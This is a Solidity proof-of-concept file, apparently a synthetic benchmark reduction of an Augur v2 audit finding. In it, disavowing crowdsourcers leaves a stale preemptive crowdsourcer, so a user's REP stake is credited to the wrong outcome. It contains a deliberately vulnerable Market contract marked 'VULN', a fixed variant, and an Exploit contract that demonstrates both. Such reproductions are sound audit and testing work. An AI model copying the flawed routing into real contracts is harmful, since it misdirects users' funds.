// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Augur — contributeToTentative credits a stale preemptive crowdsourcer
    (OpenZeppelin, Augur Core v2 components, H04, Feb 2020).
    SYNTHETIC, cheatcode-free reduction. Audited commit 67c0fec.
    disavowCrowdsourcers resets the dispute chain to the initial reporter
    and does not clear preemptiveDisputeCrowdsourcer. contributeToTentative
    checks the user's numerators against the new tentative outcome, then
    overload=true loads the old preemptive crowdsourcer anyway.
    N REP is credited to outcome A. The user paid for outcome B.
    The fixed disavow clears the preemptive crowdsourcer, so N lands on B. */

contract Rep {
    string public name = "Reputation";
    string public symbol = "REP";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Crowdsourcer {
    bytes32 public payoutHash;
    uint256 public stake;
    uint256[] public payoutNumerators;

    constructor(bytes32 _payoutHash, uint256[] memory _payoutNumerators) {
        payoutHash = _payoutHash;
        payoutNumerators = _payoutNumerators;
    }

    function credit(uint256 amount) external {
        stake += amount;
    }
}

contract Market {
    Rep public rep;
    bool public forking;
    Crowdsourcer public preemptiveDisputeCrowdsourcer;
    Crowdsourcer[] public participants;
    bytes32 public lastHash;
    uint256 public lastAmount;
    event Routed(bytes32 requested, address crowdsourcer);

    constructor(address _rep) {
        rep = Rep(_rep);
    }

    function configure(Crowdsourcer initialReporter, Crowdsourcer tentative, Crowdsourcer preemptive) external {
        participants.push(initialReporter);
        participants.push(tentative);
        preemptiveDisputeCrowdsourcer = preemptive;
        forking = true;
    }

    function disavowCrowdsourcers() public virtual {
        require(forking, "fork");
        Crowdsourcer initialReporter = participants[0];
        delete participants;
        participants.push(initialReporter);
    }

    function contributeToTentative(uint256[] memory nums, uint256 amount) public returns (address credited) {
        bytes32 hash = keccak256(abi.encode(nums));
        require(hash == participants[participants.length - 1].payoutHash(), "not tentative");
        Crowdsourcer crowdsourcer = getOrCreate(hash, nums, true);
        rep.transferFrom(msg.sender, address(crowdsourcer), amount);
        crowdsourcer.credit(amount);
        lastHash = crowdsourcer.payoutHash();
        lastAmount = amount;
        credited = address(crowdsourcer);
    }

    function getOrCreate(bytes32 hash, uint256[] memory nums, bool overload) internal returns (Crowdsourcer crowdsourcer) {
        // @> VULN: overload returns the preemptive crowdsourcer and ignores the payout hash the user just paid for
        emit Routed(hash, address(preemptiveDisputeCrowdsourcer)); crowdsourcer = overload ? preemptiveDisputeCrowdsourcer : Crowdsourcer(address(0));
        if (address(crowdsourcer) == address(0)) {
            crowdsourcer = new Crowdsourcer(hash, nums);
            if (overload) {
                preemptiveDisputeCrowdsourcer = crowdsourcer;
            }
        }
    }
}

contract FixedMarket is Market {
    constructor(address _rep) Market(_rep) {}

    function disavowCrowdsourcers() public override {
        super.disavowCrowdsourcers();
        preemptiveDisputeCrowdsourcer = Crowdsourcer(address(0));
    }
}

contract User {
    function approve(address rep, address market, uint256 amount) external {
        Rep(rep).approve(market, amount);
    }

    function contribute(address market, uint256[] memory nums, uint256 amount) external returns (address) {
        return Market(market).contributeToTentative(nums, amount);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Rep public rep;
    Crowdsourcer public initialB;
    Crowdsourcer public preemptiveA;
    Crowdsourcer public preemptiveFixed;
    User public user;
    Market public attackMarket;
    FixedMarket public fixedMarket;

    bytes32 public hashA;
    bytes32 public hashB;
    uint256 public wrongStake;
    uint256 public controlStake;
    bytes32 public wrongHash;
    bytes32 public controlHash;

    constructor() {
        uint256[] memory numsA = new uint256[](2);
        uint256[] memory outcomeB = new uint256[](2);
        numsA[0] = 0;
        numsA[1] = 1;
        outcomeB[0] = 1;
        outcomeB[1] = 0;
        hashA = keccak256(abi.encode(numsA));
        hashB = keccak256(abi.encode(outcomeB));

        rep = new Rep();
        initialB = new Crowdsourcer(hashB, outcomeB);
        preemptiveA = new Crowdsourcer(hashA, numsA);
        preemptiveFixed = new Crowdsourcer(hashA, numsA);
        user = new User();
        attackMarket = new Market(address(rep));
        fixedMarket = new FixedMarket(address(rep));

        Crowdsourcer tentativeA = new Crowdsourcer(hashA, numsA);
        Crowdsourcer tentativeFixed = new Crowdsourcer(hashA, numsA);
        attackMarket.configure(initialB, tentativeA, preemptiveA);
        fixedMarket.configure(initialB, tentativeFixed, preemptiveFixed);
        rep.mint(address(user), 2 * N);
    }

    function numsB() public pure returns (uint256[] memory nums) {
        nums = new uint256[](2);
        nums[0] = 1;
        nums[1] = 0;
    }

    function run() external {
        require(hashA != hashB, "hashes");
        user.approve(address(rep), address(attackMarket), N);
        user.approve(address(rep), address(fixedMarket), N);
        attackMarket.disavowCrowdsourcers();
        require(address(attackMarket.preemptiveDisputeCrowdsourcer()) == address(preemptiveA), "stale");
        user.contribute(address(attackMarket), numsB(), N);
        wrongHash = attackMarket.lastHash();
        wrongStake = attackMarket.lastAmount();
        require(wrongHash == hashA, "credited A");
        require(wrongStake == N, "amount");
        require(rep.balanceOf(address(preemptiveA)) == N, "A balance");
        fixedMarket.disavowCrowdsourcers();
        require(address(fixedMarket.preemptiveDisputeCrowdsourcer()) == address(0), "cleared");
        user.contribute(address(fixedMarket), numsB(), N);
        controlHash = fixedMarket.lastHash();
        controlStake = fixedMarket.lastAmount();
        require(controlHash == hashB, "credited B");
        require(controlStake == N, "control amount");
        require(rep.balanceOf(address(user)) == 0, "user spent 2N");
    }
}
